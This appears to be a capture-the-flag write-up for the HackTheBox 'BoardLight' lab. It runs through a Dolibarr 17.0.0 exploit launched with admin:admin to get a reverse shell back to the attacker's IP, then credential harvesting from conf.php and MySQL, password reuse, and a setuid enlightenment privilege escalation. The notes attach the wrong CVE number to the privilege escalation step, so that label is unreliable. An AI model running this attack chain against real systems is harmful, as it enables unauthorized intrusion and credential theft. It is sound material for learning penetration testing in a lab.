### NMAP 

`sudo nmap -sC -v -sV -vv -oA nmap-boardlight 10.10.11.11`

![[HackTheBox/Linux/attachments/Pasted image 20250506212022.png]]
- 22, 80

Navigate to the website 

![[HackTheBox/Linux/attachments/Pasted image 20250506212145.png]]

Attempt the `/index.html`

![[HackTheBox/Linux/attachments/Pasted image 20250506212241.png]]

Attempt the `/index.php`

![[HackTheBox/Linux/attachments/Pasted image 20250506212325.png]]

Checking out the links - about.php, do.php, etc.

Found host name
![[HackTheBox/Linux/attachments/Pasted image 20250506212613.png]]
- add this `board.htb` to `/etc/hosts`

![[HackTheBox/Linux/attachments/Pasted image 20250506212719.png]]

Navigate to `http://board[.]htb` now

![[HackTheBox/Linux/attachments/Pasted image 20250506212829.png]]

Playing in this text box and intercepting request with Burp

![[HackTheBox/Linux/attachments/Pasted image 20250506213257.png]]

Set up nc listener 

```
nc -lvnp 8000
```

Send request with burp

### Gobuster Virtual Hosts

Enumerate virtual hosts 

```
gobuster vhost -u http://board.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```
![[HackTheBox/Linux/attachments/Pasted image 20250506213715.png]]

Found `crm.board.htb`

![[HackTheBox/Linux/attachments/Pasted image 20250506215835.png]]
- add this to `/etc/hosts`

Navigate to this website and see a login page 
![[HackTheBox/Linux/attachments/Pasted image 20250506215940.png]]
- Dolibarr 17.0.0

Google this version for exploits and see a [PoC exploit on GitHub](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)

![[HackTheBox/Linux/attachments/Pasted image 20250506220058.png]]
Exploit asks for username, password..

Googling default dolibarr creds and they are `admin:admin`

Trying these creds to login and they do work!

Now we can try the exploit. 

Git clone the repo.

Run the exploit to see what arguments we need to supply. 

![[HackTheBox/Linux/attachments/Pasted image 20250507193029.png]]

Here is the exploit

```
python3 exploit.py http://crm.board.htb admin admin 10.10.14.8 9001
```

Set up nc listener and catch the reverse shell

![[HackTheBox/Linux/attachments/Pasted image 20250507193227.png]]
Basically the exploit ends up sending a php reverse shell in the middle of creating a new site and capitalizing one letter pHp
![[HackTheBox/Linux/attachments/Pasted image 20250507194051.png]]

Re-doing the shell with a trusty one: [ivan sincek/php reverse shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

❗got initial access❗

### Search for config / credentials

There is a conf directory 

![[HackTheBox/Linux/attachments/Pasted image 20250507195159.png]]

```
cat conf.php
```

We found some creds in this configuration file 

![[HackTheBox/Linux/attachments/Pasted image 20250507195313.png]]
![[HackTheBox/Linux/attachments/Pasted image 20250507195334.png]]
- save these creds to a file 

Check the backup file conf.php.old as well, but there's no password.

### Login to MySQL

```
mysql -u dolibarrowner -p 
```
![[HackTheBox/Linux/attachments/Pasted image 20250507195535.png]]
Select the database name
```
use dolibarr
```

Show tables 
```
show tables;
```

![[HackTheBox/Linux/attachments/Pasted image 20250507195716.png]]

Describe llx_user table
```
describe llx_user;
```

![[HackTheBox/Linux/attachments/Pasted image 20250507195749.png]]

Grab login, passwords, pass crypted 

```
select login, pass, pass_crypted from llx_user;
```

![[HackTheBox/Linux/attachments/Pasted image 20250507195911.png]]
- more creds

Normally -> go try to crack the hashes. Not the path here though.

Try to find who created the dolibarr user 

```
select rowid, login, pass, pass_crypted from llx_user;
```

![[HackTheBox/Linux/attachments/Pasted image 20250507204811.png]]
- nothing too interesting here

Enumerate users on the box 

```
cat /etc/passwd | grep 'sh$'
```

Found larissa user 
![[HackTheBox/Linux/attachments/Pasted image 20250507204937.png]]

Attempt to switch to the larissa user with the mysql password

```
su - larissa
```

![[HackTheBox/Linux/attachments/Pasted image 20250507205058.png]]

Now we have ❗initial access❗ as larissa

------------------------------------
Side track: Running linpeas and finding setuid binaries 

Find SetUID binaries

```
find / -perm -4000 2>/dev/null
```

![[HackTheBox/Linux/attachments/Pasted image 20250507205408.png]]

Some unique ones here 
![[HackTheBox/Linux/attachments/Pasted image 20250507205637.png]]

Attempt to get the version by executing enlightenment_sys with --help 

![[HackTheBox/Linux/attachments/Pasted image 20250507205732.png]]
- no dice 

Execute strings against it to find version 

![[HackTheBox/Linux/attachments/Pasted image 20250507205817.png]]
- no dice 

Run 
```
dpkg -l | grep -i enlight
```

![[HackTheBox/Linux/attachments/Pasted image 20250507205925.png]]
- Version of enlightenment - 0.23.1-4

Look for CVEs against enlightenment  

![[HackTheBox/Linux/attachments/Pasted image 20250507210047.png]]
- got one for local priv esc

Looking at the exploit code 
![[HackTheBox/Linux/attachments/Pasted image 20250507210143.png]]

Simplifying exploit a bit and executing this as www-data user

![[HackTheBox/Linux/attachments/Pasted image 20250507210518.png]]

This action isn't allowed as www-data user, but does work as larissa user. 

![[HackTheBox/Linux/attachments/Pasted image 20250507210630.png]]
after executing this exploit - CVE-2023-30253..
⭐ got root ⭐ 

---------------------------------------------

### Beyond Root 

**Why could Larissa execute the binary, but www-data couldn't? 

Because Larissa is part of the adm group

**How does this exploit work?**

Checking out the git log to see the patch logic lol

![[HackTheBox/Linux/attachments/Pasted image 20250507211126.png]]
